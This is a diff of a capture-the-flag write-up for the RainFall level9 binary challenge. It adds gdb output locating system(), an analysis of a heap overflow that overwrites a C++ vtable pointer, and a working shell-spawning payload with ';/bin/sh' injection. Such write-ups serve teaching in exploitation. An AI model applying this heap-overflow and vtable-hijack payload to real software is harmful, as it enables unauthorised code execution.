@@ -1,70 +1,10 @@
-
 ```diff
 +level9@RainFall:~$ gdb ./level9
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
-+(gdb) b main
-Breakpoint 1 at 0x80485f8
-(gdb) r
-Starting program: /home/user/level9/level9
-
-Breakpoint 1, 0x080485f8 in main ()
-+(gdb) info proc map
-process 3729
-Mapped address spaces:
-
-        Start Addr   End Addr       Size     Offset objfile
-         0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
-         0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
-        0xb7cfa000 0xb7cfc000     0x2000        0x0
-        0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
-        0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
-        0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
-        0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
-        0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
-        0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
-        0xb7d46000 0xb7d47000     0x1000        0x0
-        0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7eed000 0xb7ef0000     0x3000        0x0
-        0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
-        0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
-        0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
-        0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
-        0xb7fce000 0xb7fd5000     0x7000        0x0
-        0xb7fdb000 0xb7fdd000     0x2000        0x0
-        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-+(gdb) find 0xb7d47000,0xb7eed000, "/bin/sh"
--0xb7ea7c58
-1 pattern found.
-```
-
-Or you can use this directly;
-
-```diff
-+level9@RainFall:~$ gdb ./level9
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
+There is NO WARRANTY, to the extent permitted by law.
+...
 Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
 +(gdb) b main
 Breakpoint 1 at 0x80485f8
@@ -72,18 +12,50 @@ Breakpoint 1 at 0x80485f8
 Starting program: /home/user/level9/level9
 
 Breakpoint 1, 0x080485f8 in main ()
-+(gdb) find &system, &system+2000000,"/bin/sh"
--0xb7ea7c58
-1 pattern found.
-(gdb)
++(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7d86060 <system>
++(gdb) q
 ```
 
-
-## /bin/sh
+## System Address (Little Endian)
 ```
-address         =   0xb7ea7c58
-little indian   =   "\x58\x7c\xea\xb7"
+address         =   0xb7d86060
+little indian   =   "\x60\x60\xd8\xb7"
 ```
 
-> https://ctf101.org/binary-exploitation/return-oriented-programming/
+---
 
+### 1. Vulnerability Analysis
+
+A heap-based buffer overflow vulnerability was identified in the `setAnnotation` method of the `N` class in `level9.cpp`. The `memcpy` function does not validate the size of the user-controlled input (`text`) against the 100-byte capacity of the destination buffer (`annotation`).
+
+This allows an overflow from the `n1` object, which is allocated first on the heap, into the subsequently allocated `n2` object. This overwrite capability allows for the modification of the `vptr` (Virtual Function Table Pointer) of the `n2` object.
+
+### 2. Exploitation Strategy
+
+The exploit strategy is comprised of two phases:
+
+**Phase 1: Control Flow Hijacking**
+
+The primary objective is to redirect the virtual function call (`*n2 + *n1`) to the `system()` function within the `libc` library. This is achieved by overwriting the `vptr` of `n2` to point to a controlled address. This address, assumed to be a static heap location (`0x0804a00c`), is the start of the `n1->annotation` buffer, which is repurposed as a "Fake Vtable". The first entry of this fake vtable is set to the address of the `system()` function (`0xb7d86060`).
+
+**Phase 2: Command Injection via Argument Manipulation**
+
+A key challenge is that the hijacked call results in `system(&n1)`, where the argument is a pointer to the `n1` object, not a valid command string. This is bypassed by leveraging a feature of the `/bin/sh` shell, which is invoked by `system()`. The semicolon character (`;`) is a command separator.
+
+By injecting the string `;/bin/sh` into the payload, the argument passed to the shell becomes `"[GARBAGE_DATA];/bin/sh"`. The shell fails to execute the initial garbage data but then proceeds to execute the valid command `/bin/sh` after the separator, thus launching a new shell.
+
+### 3. Final Payload
+
+The final working payload that implements this strategy is constructed as follows:
+
+```bash
+./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"')
+```
+
+This payload contains the following critical components:
+
+- **`system()` Function Address (`0xb7d86060`):** The target function for redirection.
+- **Padding (`"A" * 104`):** Bytes used to reach and align the overwrite.
+- **Target Memory Address (`0x0804a00c`):** The static heap address used to point to the controlled data.
+- **Command Injection (`;/bin/sh`):** The command separator and payload to acquire a shell.
